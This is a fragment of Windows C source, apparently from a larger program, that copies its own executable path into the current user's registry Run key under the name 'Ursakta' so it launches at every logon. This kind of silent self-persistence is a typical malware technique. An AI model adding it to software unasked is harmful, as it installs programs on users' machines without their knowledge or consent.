...
int main() {
	TCHAR cwdfilename[MAX_PATH];
	LPCTSTR subkey = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
	HKEY hkey = NULL;
	LPCTSTR keyname = TEXT("Ursakta");
	GetModuleFileNameA(NULL, cwdfilename, MAX_PATH);
	LONG cstat = RegCreateKey(HKEY_CURRENT_USER, subkey, &hkey);
	LONG sstat = RegSetValueEx(hkey, keyname, 0, REG_SZ, (LPBYTE)cwdfilename, _tcslen(cwdfilename) * sizeof(TCHAR)); 
	//DWORD vcheck = 0;
	PCHAR vbrowser = "n";
	//char *vbrowser;
